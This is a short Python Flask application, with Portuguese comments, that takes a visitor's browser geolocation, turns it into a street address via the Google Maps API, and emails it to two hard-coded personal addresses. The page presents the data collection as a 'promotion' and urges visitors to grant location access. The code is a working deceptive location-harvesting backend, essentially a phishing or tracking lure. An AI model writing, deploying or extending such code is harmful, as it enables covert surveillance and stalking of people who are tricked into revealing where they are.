import os
import requests
from flask import Flask, request, jsonify, render_template
from flask_mail import Mail, Message
from dotenv import load_dotenv

# Carregar variáveis de ambiente do arquivo .env
load_dotenv()

app = Flask(__name__)

# Configurações do Flask-Mail usando variáveis de ambiente
app.config['MAIL_SERVER'] = 'smtp.hostinger.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')  # Carregar do arquivo .env
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')  # Carregar do arquivo .env
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False

mail = Mail(app)

# Chave de API do Google Maps carregada do arquivo .env
google_maps_api_key = os.getenv('GOOGLE_MAPS_API_KEY')  # Carregar do arquivo .env

def get_address_from_coords(lat, lng):
    url = f'https://maps.googleapis.com/maps/api/geocode/json?latlng={lat},{lng}&key={google_maps_api_key}'
    response = requests.get(url)
    if response.status_code == 200:
        results = response.json().get('results')
        if results:
            return results[0].get('formatted_address')
    return 'Endereço não encontrado'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data['latitude']
    longitude = data['longitude']
    
    address = get_address_from_coords(latitude, longitude)
    
    msg = Message(
        'Localização Atual', 
        sender=os.getenv('MAIL_USERNAME'),  # Carregar do arquivo .env
        recipients=['flaviorioclaro@hotmail.com', 'flavinho2009anjo21@hotmail.com']  # Substitua pelo e-mail do destinatário
    )
    msg.body = f'Endereço: {address}\nLatitude: {latitude}\nLongitude: {longitude}'
    
    try:
        mail.send(msg)
        return jsonify({'message': 'Obrigado em Participar da nossa Promoção!'}), 200
    except Exception as e:
        return jsonify({'message': 'Permita que seu navegador acesse sua Localização e Aproveite a Promoção de sua cidade'}), 500

if __name__ == '__main__':
    app.run(debug=True)
